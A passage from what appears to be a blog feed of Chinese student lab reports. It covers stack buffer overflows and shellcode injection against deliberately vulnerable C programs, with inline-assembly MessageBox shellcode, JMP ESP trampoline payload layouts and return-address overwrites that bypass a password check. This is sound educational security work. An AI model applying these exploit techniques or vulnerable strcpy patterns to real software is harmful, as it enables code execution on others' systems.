class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"1234567"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span> <span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> authenticated;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">44</span>];</span><br><span class="line">authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="built_in">buffer</span>,password);<span class="comment">//over flowed here!</span></span><br><span class="line"><span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line">FILE * fp;</span><br><span class="line">LoadLibrary(<span class="string">"user32.dll"</span>);<span class="comment">//prepare for messagebox</span></span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(<span class="string">"password.txt"</span>,<span class="string">"rw+"</span>)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,password);</span><br><span class="line">valid_flag = verify_password(password);</span><br><span class="line"><span class="keyword">if</span>(valid_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"incorrect password!\n"</span>);</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line">system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>头文件中包含<code>windows.h</code>，方便调用<code>LoadLibrary()</code>函数去装载<code>user32.dll</code>，以便在植入的代码中调用<code>MseeageBox</code></li><li>在主函数打开程序同目录下的<code>password.txt</code>文件并读取文件内容即密码，若无法打开，则直接退出程序</li><li>跳转到子函数<code>verify_password()</code>判断输入的密码是否正确即判断输入的密码<code>password</code>与正确的密码<code>1234567</code>是否相等,如果相等则子函数返回<code>0</code>，否则返回非<code>0</code>，在函数返回之前将输入的<code>password</code>拷贝到数组<code>buffer[44]</code>里面</li><li>主函数在判断子函数<code>verify_password()</code>返回值：如果是<code>0</code>，则输出<code>Congratulation! You have passed the</code><br><code>verification!</code>，关闭<code>password.txt</code>文件，结束程序，否则输出<code>incorrect password!</code>，关闭<code>password.txt</code>文件，结束程序</li></ol><h1 id="通过淹没静态地址来实现shellcode的代码植入"><a href="#通过淹没静态地址来实现shellcode的代码植入" class="headerlink" title="通过淹没静态地址来实现shellcode的代码植入"></a>通过淹没静态地址来实现<code>shellcode</code>的代码植入</h1><ol><li><p>使用<code>Depends.exe</code>对程序<code>overflow.exe</code>进行剖析(参数保持默认)</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565836316689.png" alt="1565836316689"></p><ol><li><p>点击<code>kernel32.dll</code>，在右侧窗口找到<code>exitprocess</code>的函数入口点为<code>0x0001B0BB</code>，在下方窗口找到<code>kernel32.dll</code>的实际基址为<code>0x77E60000</code>，两个地址相加可得<code>exitprocess</code>的入口地址：<code>0x77E8B0B0</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565836376754.png" alt="1565836376754"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565836386263.png" alt="1565836386263"></p></li><li><p>同理在<code>user32.dll</code>，在右侧窗口找到<code>MessageBoxA</code>的函数入口点为<code>0x00033D68</code>，在下方窗口找到user32.dll的实际基址为<code>0x77DF0000</code>，两个地址相加可得<code>MessageBoxA</code>的入口地址：<code>0x77E23D68</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565836456007.png" alt="1565836456007"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565836461058.png" alt="1565836461058"></p></li></ol></li><li><p>打开<code>shellcode</code>文件源码并阅读、理解，在工程文件<code>overflow</code>同目录下新建项目<code>shellcode</code>，将源代码拷贝并作出相应更改：将弹出框标题改为<code>ABCD1234</code>，将<code>exitprocess</code>的入口地址改为<code>0x77E8B0B0</code>，将<code>MessageBoxA</code>的入口地址改为<code>0x77E23D68</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HINSTANCE LibHandle;</span><br><span class="line"><span class="keyword">char</span> dllbuf[<span class="number">11</span>] = <span class="string">"user32.dll"</span>;</span><br><span class="line">LibHandle = LoadLibrary(dllbuf);</span><br><span class="line">_asm&#123;</span><br><span class="line">sub sp,<span class="number">0x440</span></span><br><span class="line"><span class="keyword">xor</span> ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push <span class="number">0x34333231</span><span class="comment">//1234</span></span><br><span class="line">push <span class="number">0x44434241</span><span class="comment">//ABCD</span></span><br><span class="line"></span><br><span class="line">mov eax,esp</span><br><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line"></span><br><span class="line">mov eax,<span class="number">0x77E23D68</span><span class="comment">//messageboxA  入口地址</span></span><br><span class="line">call eax</span><br><span class="line">push ebx</span><br><span class="line">mov eax,<span class="number">0x77E7B0BB</span><span class="comment">//exitprocess  入口地址</span></span><br><span class="line">call eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下图，对话框正常弹出</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565845037488.png" alt="1565845037488"></p></li><li><p>使用<code>ollydbg</code>打开新建的<code>shellcode.exe</code>文件，分析获取弹对话框部分的<code>shellcode</code></p><ol><li><p>定位到<code>shellcode</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565845700629.png" alt="1565845700629"></p></li><li><p>将<code>shellcode</code>内容复制为文件如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565845769821.png" alt="1565845769821"></p></li></ol></li><li><p>使用<code>ollydbg</code>打开<code>overflow.exe</code>文件，在<code>strcpy</code>处设置断点，当程序运行到此处时，缓冲区中的<code>dest</code>指向的地址<code>0x12FAF0</code>即为要注入的<code>shellcode</code>的起始地址</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565846024211.png" alt="1565846024211"></p></li><li><p>构建<code>password.txt</code>以注入<code>shellcode</code></p><ol><li><p>用<code>UltraEdit</code>新建<code>password.txt</code>，并切换成<code>16</code>进制编辑的方式</p></li><li><p>根据栈中的位置计算返回地址应该在<code>44(buff) +</code><br><code>4(authenticated) + 4(EBP) = 52</code>的偏移后的第<code>53-56</code>字节</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565845495853.png" alt="1565845495853"></p></li><li><p>构造的txt文件，格式为<code>Shellcode+若干0x90 +shellcode在缓冲区的起始地址</code></p><p>即通过调整<code>0x90</code>的数量来保证第<code>53-56</code>字节是<code>shellcode</code>在缓冲区的起始地址</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565846378550.png" alt="1565846378550"></p></li><li><p>完成后保存到<code>overflow_exe</code>项目的<code>debug</code>目录下，运行 <code>exe</code>程序，弹出对话框。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565846426783.png" alt="1565846426783"></p></li></ol></li></ol><h1 id="通过跳板来实现shellcode的代码植入"><a href="#通过跳板来实现shellcode的代码植入" class="headerlink" title="通过跳板来实现shellcode的代码植入"></a>通过跳板来实现<code>shellcode</code>的代码植入</h1><ol><li><p>使用<code>ollydbg</code>打开<code>overflow.exe</code>文件</p></li><li><p>在<code>strcpy</code>函数上设置断点，运行至断点。然后右键选择<code>overflow return address -&gt;ASCII overflow returns -&gt;search JMP/CALL ESP</code>，搜索<code>JMP/CALL ESP</code>语句，并点击日志查看,选择一条在<code>user32</code>中的<code>JMP ESP</code>指令，记录地址<code>0x77E2E32A</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565846888982.png" alt="1565846888982"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565847088620.png" alt="1565847088620"></p></li><li><p>更改<code>password.txt</code>文件，其结构为 <code>52字节填充物 + 4字节JMP ESP地址(逆 序) + shellcode + 若干0x90</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565847313872.png" alt="1565847313872"></p></li><li><p>运行overflow.exe，对话框弹出</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565847560360.png" alt="1565847560360"></p></li></ol><h1 id="修改汇编语句的shellcode实现修改标题"><a href="#修改汇编语句的shellcode实现修改标题" class="headerlink" title="修改汇编语句的shellcode实现修改标题"></a>修改汇编语句的<code>shellcode</code>实现修改标题</h1><ol><li><p>将标题修改为软件安全，新建shellcode1代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HINSTANCE LibHandle;</span><br><span class="line"><span class="keyword">char</span> dllbuf[<span class="number">11</span>] = <span class="string">"user32.dll"</span>;</span><br><span class="line">LibHandle = LoadLibrary(dllbuf);</span><br><span class="line">_asm&#123;</span><br><span class="line">sub sp,<span class="number">0x440</span></span><br><span class="line"><span class="keyword">xor</span> ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line"></span><br><span class="line">push <span class="number">0xABC8B2B0</span><span class="comment">//安全</span></span><br><span class="line">push <span class="number">0XFEBCEDC8</span><span class="comment">//软件</span></span><br><span class="line">push <span class="number">0x00000000</span><span class="comment">//阻断</span></span><br><span class="line">push <span class="number">0x34333231</span><span class="comment">//1234</span></span><br><span class="line">push <span class="number">0x44434241</span><span class="comment">//ABCD</span></span><br><span class="line"></span><br><span class="line">mov eax,esp</span><br><span class="line">push ebx <span class="comment">//MB_OK</span></span><br><span class="line">add eax, <span class="number">12</span></span><br><span class="line">push eax <span class="comment">//title</span></span><br><span class="line">sub eax, <span class="number">12</span></span><br><span class="line">push eax <span class="comment">//text</span></span><br><span class="line">push ebx <span class="comment">//NULL</span></span><br><span class="line"></span><br><span class="line">mov eax,<span class="number">0x77E23D68</span><span class="comment">//messageboxA  入口地址</span></span><br><span class="line">call eax</span><br><span class="line">push ebx</span><br><span class="line">mov eax,<span class="number">0x77E7B0BB</span><span class="comment">//exitprocess  入口地址</span></span><br><span class="line">call eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>程序运行结果如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565847876404.png" alt="1565847876404"></p></li></ol><h1 id="测试结论"><a href="#测试结论" class="headerlink" title="测试结论"></a>测试结论</h1><p>​        <code>shellcode</code>是利用特定漏洞的二进制代码，利用缓冲区溢出等原理达到获取权限的目的。本次实验通过查找并计算所需函数的入口地址，得到一段汇编语言写的<code>shellcode</code>代码，并通过淹没静态地址和利用跳板的方法两种方法成功进行了<code>shellcode</code>代码注入，更深一步了解了函数跳转的原理，同时也明白了<code>shellcode</code>代码植入的危害性。实验过程中发现如果shellcode的地址含有空(<code>\0</code>)，<code>shellcode</code>会被截断。其中修改原理图示如下:</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848011587.png" alt="1565848011587"></p><h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><p>在不修改<code>StackOverrun</code>程序源代码的情况下，构造<code>shellcode</code>，通过<code>jmp esp</code>的方式实现通过记事本打开<code>shellcode.txt</code>（可使用<code>CreateProcessA</code>或<code>WinExec</code>等<code>API</code>）</p><ol><li><p>使用<code>OllyDbg</code>查找程序<code>StackOverrun.exe</code>中的<code>jmp esp</code>的地址，选取其中一个：<code>0x77F8948B</code>，将其作为返回地址进行修改。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848379938.png" alt="1565848379938"></p></li><li><p>程序运行结束时，使用<code>JMP ESP</code>指令跳转到<code>ESP</code>地址处，单步运行，查看<code>EBP</code>为<code>0x0012FFC0</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848390125.png" alt="1565848390125"></p></li><li><p>在地址<code>0x0012FF74</code>处修改成如下汇编语句</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848400080.png" alt="1565848400080"></p></li><li><p>构造<code>shellcode</code>结构：<code>12字节填充物 + jmp esp地址 + 汇编机器码 + notepad&quot; &quot;shellcode</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848407673.png" alt="1565848407673"></p></li><li><p>使用命令行运行程序，参数为上述<code>shellcode</code>的<code>txt</code>文本形式</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848414568.png" alt="1565848414568"></p></li><li><p>运行程序后显示未找到<code>shellcode.txt</code>，显示是否新建文件</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848422212.png" alt="1565848422212"></p></li><li><p>根据提示，新建<code>txt</code>文件，内容为<code>123</code>，再次使用命令行运行程序，发现成功打开新建的<code>shellcode.txt</code>文件</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848427852.png" alt="1565848427852"></p></li><li><p>搜索该新建的<code>shellcode.txt</code>文件，发现其在<code>C</code>盘目录下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565848433371.png" alt="1565848433371"></p></li><li><p>分析原因，可能是<code>shellcode</code>构造时汇编语言不精确导致的，现在还未弄清楚。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出 实验报告</title>
      <link href="/%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html"/>
      <url>/%E6%A0%88%E6%BA%A2%E5%87%BA-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ol><li>通过对程序输入的密码的长度、内容等修改用<code>Ollydbg</code>来验证缓冲区溢出的发生；</li><li>完成淹没相邻变量改变程序流程实验；</li><li>完成淹没返回地址改变程序流程实验。<a id="more"></a></li></ol><h1 id="理解程序"><a href="#理解程序" class="headerlink" title="理解程序"></a>理解程序</h1><p>阅读并理解代码 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"1234567"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">verify_password</span> <span class="params">(<span class="keyword">char</span> *password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> authenticated;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">8</span>];<span class="comment">// add local buff</span></span><br><span class="line">authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="built_in">buffer</span>,password);<span class="comment">//over flowed here!</span></span><br><span class="line"><span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"please input password:       "</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>,password);</span><br><span class="line"></span><br><span class="line">valid_flag = verify_password(password);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(valid_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"incorrect password!\n\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratulation! You have passed the verification!\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>在主函数内输入密码<code>password</code></p></li><li><p>跳转到子函数<code>verify_password()</code>判断输入的密码是否正确即判断输入的密码<code>password</code>与正确的密码<code>1234567</code>是否相等,如果相等则子函数返回0，否则返回非0，在函数返回之前将输入的<code>password</code>拷贝到数组<code>buffer[8]</code>里面</p></li><li><p>主函数在判断子函数<code>verify_password()</code>返回值：如果是0，则输出<code>Congratulation! You have passed the verification!</code>，结束程序，否则输出<code>incorrect password!</code>，继续输入密码<code>password</code>重复上述过程</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565799697555.png" alt="1565799697555"></p></li></ol><h1 id="验证缓冲区溢出"><a href="#验证缓冲区溢出" class="headerlink" title="验证缓冲区溢出"></a>验证缓冲区溢出</h1><p>(通过对程序输入的密码的长度、内容等修改验证缓冲区溢出的发生)</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>下图是栈中缓冲区示意图，其中每一行占四个字节，发生缓冲区溢出只需设置数组<code>buffer[8]</code>的长度大于<code>8</code>字节。是<code>buffer</code>的值覆盖<code>authenticated</code>等的值。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565799861740.png" alt="1565799861740"></p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><ol><li><p>使用<code>Ollydbg</code>打开<code>overflow_var.exe</code>文件</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565799976558.png" alt="1565799976558"></p></li><li><p>同时按下<code>Alt</code>和<code>F9</code>执行到用户代码如下图：在地址为<code>00401724</code>处<code>CALL test.00401014</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800007485.png" alt="1565800007485"></p></li><li><p>找到地址<code>00401014</code>处 <code>JMP test.main</code>，即此处向下为用户代码，通过分析用户代码，发现<code>00401030</code>至<code>0040107F</code>为子函数<code>verify_password()</code>反汇编代码</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800057648.png" alt="1565800057648"></p></li><li><p>分析反汇编代码，找到源代码<code>strcpy(buffer,password)</code>所在的位置发现在<code>00401064</code>处，设置断点。然后点击运行，输入密码为<code>444</code>程序走到这个语句时会自动停止，接着点击不进入函数的单步调试按钮</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800090252.png" alt="1565800090252"></p></li><li><p>调试过程中观察右下角栈数据，发现两个地址被赋值为<code>444</code> 其中<code>4</code>的<code>ASCII码</code>为<code>0x34</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800116530.png" alt="1565800116530"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800210253.png" alt="1565800210253"></p></li><li><p>继续运行，输入密码为<code>AAAAAAAAABC</code>,重复上述操作，得到结果如下，由于填写的字符串超过位数，已经将邻接的变量覆盖,即缓冲区已经溢出。其中<code>A</code>的<code>ASCII码</code>为<code>0x41</code>。其中<code>buffer[8]</code>的地址为<code>0012FB18——0012FB1F</code>，<code>authenticated</code>的地址为<code>0012FB20——0012FB23</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800272406.png" alt="1565800272406"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800278163.png" alt="1565800278163"></p></li></ol><h1 id="淹没相邻变量改变程序流程"><a href="#淹没相邻变量改变程序流程" class="headerlink" title="淹没相邻变量改变程序流程"></a>淹没相邻变量改变程序流程</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>下图是栈中缓冲区示意图，其中每一行占<strong>四个字节</strong>，只需增加数组<code>buffer[8]</code>的长度将原来<code>authenticated</code>的值覆盖掉，更改为想要的值即可，即如果想要跳过密码，只需要将<code>authenticated</code>的值覆盖为<code>0</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565799861740.png" alt="1565799861740"></p><h2 id="操作过程-1"><a href="#操作过程-1" class="headerlink" title="操作过程"></a>操作过程</h2><ol><li><p>输入错误密码<code>1234</code>，查看<code>buffer[8]</code>和<code>authenticated</code>的值</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800411998.png" alt="1565800411998"></p><p><code>Buffer[0-7]:0x34333231 CCCCCC00</code> (其中<code>00</code>是字符串结束符标识)</p><p><code>Authenticated:0XFFFFFFFF</code>(因为<code>1234</code>&lt;<code>1234567</code>,<code>authenticated</code>的值为<code>-1</code>，写成补码的形式即为<code>0xFFFFFFFF</code>)</p><p>运行结果如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800478425.png" alt="1565800478425"></p></li><li><p>输入错误密码<code>2345</code>，查看<code>buffer[8]</code>和<code>authenticated</code>的值</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800508388.png" alt="1565800508388"></p><p><code>Buffer[0-7]:0x35343332 CCCCCC00</code> (其中<code>00</code>是字符串结束符标识)</p><p><code>Authenticated:0X00000001</code> (因为<code>2345</code>&gt;<code>1234567</code>,<code>authenticated</code>的值为<code>1</code>，写成补码的形式即为<code>0x00000001</code>)</p><p>运行结果如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800555252.png" alt="1565800555252"></p></li><li><p>输入正确密码<code>1234567</code>，查看<code>buffer[8]</code>和<code>authenticated</code>的值</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800579050.png" alt="1565800579050"></p><p><code>Buffer[0-7]:0x34333231 00373635</code> (其中<code>00</code>是字符串结束符标识)</p><p><code>Authenticated:0X00000000</code></p><p>运行结果如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800609024.png" alt="1565800609024"></p></li><li><p>根据上述三次密码输入和对代码的分析，当<code>authenticated</code>的值为<code>0x00000000</code>时，才能得到正确的输出结果，即跳过密码。</p><p>为此，采用将密码输入为<code>8</code>位(这<code>8</code>个数要比<code>1234567</code>大，否则会导致<code>authenticate</code>补码较大如<code>0Xffffff00</code>)，即末尾的空白结束符将<code>authenticated</code>的<code>0x01</code>淹没。</p><p>随机输入密码<code>23456789</code>查看<code>buffer[8]</code>和<code>authenticated</code>的值</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800684920.png" alt="1565800684920"></p><p><code>Buffer[0-7]:0x35343332  39383736</code> </p><p><code>Authenticated:0X00000000</code></p><p><code>Buffer</code>的结束符淹没了<code>authenticated</code>的值使<code>authenticated</code>的值为<code>0x00000000</code></p><p>运行结果如下</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800712667.png" alt="1565800712667"></p><p>显示密码输入正确，实现了淹没相邻变量改变程序流程。</p></li></ol><h1 id="淹没返回地址改变程序流程"><a href="#淹没返回地址改变程序流程" class="headerlink" title="淹没返回地址改变程序流程"></a>淹没返回地址改变程序流程</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>下图是栈中缓冲区示意图，其中每一行占<strong>四个字节</strong>。只需要先放置16个字符串，然后接下来的<code>4</code>个字节就能够淹没返回地址，达到控制返回地址的目的。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565799861740.png" alt="1565799861740"></p><h2 id="操作过程-2"><a href="#操作过程-2" class="headerlink" title="操作过程"></a>操作过程</h2><ol><li><p>由于返回地址的数据有些不是能通过可见的<code>ASCII字符</code>表示的，修改程序，让文件作为输入源</p></li><li><p>使用<code>ollydbg</code>打开该<code>overflow_ret.exe</code>文件，通过查找字符串发现如果密码正确，程序会到地址<code>0x0040112F</code>出继续执行程序， 接下来的工作就是将返回地址修改为<code>0x0040112F</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800877672.png" alt="1565800877672"></p></li><li><p>在<code>overflow_ret\Dbug</code>目录下新建<code>password.txt</code>文件，使用<code>UltraEdit</code>进行编辑(记事本只能输入可见的文字,有局限),利用<code>Ctrl+H</code>进入二进制编辑模式，前16个字节输入<code>AAAAAAAAAAAAAAAA</code>，在<code>17-20</code>字节上填下地址<code>0x0040112F</code>(注意从右向左填) ，保存文件</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800935070.png" alt="1565800935070"></p></li><li><p>使用<code>ollydbg</code>再次调试<code>overflow_ret.exe</code>文件，会直接弹出<code>Congratulation! You have passed the verification!</code>，即密码输入正确</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800965098.png" alt="1565800965098"></p></li><li><p>由于修改了返回地址，导致<strong>栈平衡出错</strong>，最后会显示调试的程序无法处理例外</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565800984564.png" alt="1565800984564"></p></li></ol><h1 id="思考题"><a href="#思考题" class="headerlink" 